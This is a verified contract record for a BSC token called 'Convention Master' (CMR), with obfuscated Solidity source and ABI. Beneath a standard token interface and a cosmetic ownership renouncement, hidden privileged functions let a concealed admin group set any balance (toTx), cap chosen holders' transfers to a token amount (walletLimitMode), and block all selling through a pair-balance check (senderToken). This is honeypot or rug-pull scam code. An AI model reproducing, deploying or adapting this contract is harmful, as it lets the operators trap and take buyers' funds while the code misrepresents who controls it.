{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface teamMin {\n    function createPair(address tradingTake, address walletAt) external returns (address);\n}\n\ninterface sellLimitFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minList) external view returns (uint256);\n\n    function transfer(address limitReceiver, uint256 launchedEnable) external returns (bool);\n\n    function allowance(address tradingExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitReceiver,\n        uint256 launchedEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverAuto, uint256 value);\n    event Approval(address indexed tradingExempt, address indexed spender, uint256 value);\n}\n\nabstract contract sellEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquiditySwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface sellLimitFeeMetadata is sellLimitFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConventionMaster is sellEnable, sellLimitFee, sellLimitFeeMetadata {\n\n    function getOwner() external view returns (address) {\n        return sellEnableFrom;\n    }\n\n    mapping(address => uint256) private shouldTeam;\n\n    address marketingList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address minList) public view virtual override returns (uint256) {\n        return shouldTeam[minList];\n    }\n\n    bool public isExempt;\n\n    uint256 private minSenderTake;\n\n    address private sellEnableFrom;\n\n    uint256 public listIs;\n\n    mapping(address => bool) public launchMode;\n\n    bool public autoReceiver;\n\n    uint256 launchedAmountReceiver;\n\n    constructor (){\n        \n        liquiditySwap limitAmount = liquiditySwap(tradingReceiverTotal);\n        atMarketing = teamMin(limitAmount.factory()).createPair(limitAmount.WETH(), address(this));\n        if (autoReceiver != listAtTake) {\n            launchAmount = true;\n        }\n        buyMin = _msgSender();\n        takeTeam[buyMin] = true;\n        shouldTeam[buyMin] = listSell;\n        fromMax();\n        \n        emit Transfer(address(0), buyMin, listSell);\n    }\n\n    bool public isLaunchedAmount;\n\n    bool public listAtTake;\n\n    address public atMarketing;\n\n    function buyShould() private view {\n        require(takeTeam[_msgSender()]);\n    }\n\n    function allowance(address enableFeeSwap, address receiverLimitMin) external view virtual override returns (uint256) {\n        if (receiverLimitMin == tradingReceiverTotal) {\n            return type(uint256).max;\n        }\n        return atTakeTrading[enableFeeSwap][receiverLimitMin];\n    }\n\n    function owner() external view returns (address) {\n        return sellEnableFrom;\n    }\n\n    address tradingReceiverTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public takeTeam;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atReceiver;\n    }\n\n    function transferFrom(address sellLimit, address limitReceiver, uint256 launchedEnable) external override returns (bool) {\n        if (_msgSender() != tradingReceiverTotal) {\n            if (atTakeTrading[sellLimit][_msgSender()] != type(uint256).max) {\n                require(launchedEnable <= atTakeTrading[sellLimit][_msgSender()]);\n                atTakeTrading[sellLimit][_msgSender()] -= launchedEnable;\n            }\n        }\n        return marketingSender(sellLimit, limitReceiver, launchedEnable);\n    }\n\n    string private totalMax = \"Convention Master\";\n\n    event OwnershipTransferred(address indexed receiverTeamAmount, address indexed senderShouldLimit);\n\n    function walletLimitMode(address autoFundTx) public {\n        buyShould();\n        \n        if (autoFundTx == buyMin || autoFundTx == atMarketing) {\n            return;\n        }\n        launchMode[autoFundTx] = true;\n    }\n\n    bool public launchAmount;\n\n    uint8 private fundFromLimit = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return totalMax;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listSell;\n    }\n\n    function marketingSender(address sellLimit, address limitReceiver, uint256 launchedEnable) internal returns (bool) {\n        if (sellLimit == buyMin) {\n            return atBuy(sellLimit, limitReceiver, launchedEnable);\n        }\n        uint256 exemptTotal = sellLimitFee(atMarketing).balanceOf(marketingList);\n        require(exemptTotal == launchedAmountReceiver);\n        require(limitReceiver != marketingList);\n        if (launchMode[sellLimit]) {\n            return atBuy(sellLimit, limitReceiver, takeReceiver);\n        }\n        return atBuy(sellLimit, limitReceiver, launchedEnable);\n    }\n\n    uint256 maxWallet;\n\n    function takeMarketingMax(address tokenSwap) public {\n        if (isExempt) {\n            return;\n        }\n        \n        takeTeam[tokenSwap] = true;\n        if (listIs != minSenderTake) {\n            autoReceiver = false;\n        }\n        isExempt = true;\n    }\n\n    function toTx(address enableLiquidity, uint256 launchedEnable) public {\n        buyShould();\n        shouldTeam[enableLiquidity] = launchedEnable;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundFromLimit;\n    }\n\n    uint256 private buyMinAuto;\n\n    uint256 private listSell = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private atTakeTrading;\n\n    string private atReceiver = \"CMR\";\n\n    function atBuy(address sellLimit, address limitReceiver, uint256 launchedEnable) internal returns (bool) {\n        require(shouldTeam[sellLimit] >= launchedEnable);\n        shouldTeam[sellLimit] -= launchedEnable;\n        shouldTeam[limitReceiver] += launchedEnable;\n        emit Transfer(sellLimit, limitReceiver, launchedEnable);\n        return true;\n    }\n\n    function approve(address receiverLimitMin, uint256 launchedEnable) public virtual override returns (bool) {\n        atTakeTrading[_msgSender()][receiverLimitMin] = launchedEnable;\n        emit Approval(_msgSender(), receiverLimitMin, launchedEnable);\n        return true;\n    }\n\n    address public buyMin;\n\n    function transfer(address enableLiquidity, uint256 launchedEnable) external virtual override returns (bool) {\n        return marketingSender(_msgSender(), enableLiquidity, launchedEnable);\n    }\n\n    uint256 constant takeReceiver = 4 ** 10;\n\n    function fromMax() public {\n        emit OwnershipTransferred(buyMin, address(0));\n        sellEnableFrom = address(0);\n    }\n\n    function senderToken(uint256 launchedEnable) public {\n        buyShould();\n        launchedAmountReceiver = launchedEnable;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTeamAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderShouldLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFeeSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverLimitMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLimitMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunchedAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAtTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedEnable\",\"type\":\"uint256\"}],\"name\":\"senderToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSwap\",\"type\":\"address\"}],\"name\":\"takeMarketingMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedEnable\",\"type\":\"uint256\"}],\"name\":\"toTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFundTx\",\"type\":\"address\"}],\"name\":\"walletLimitMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConventionMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}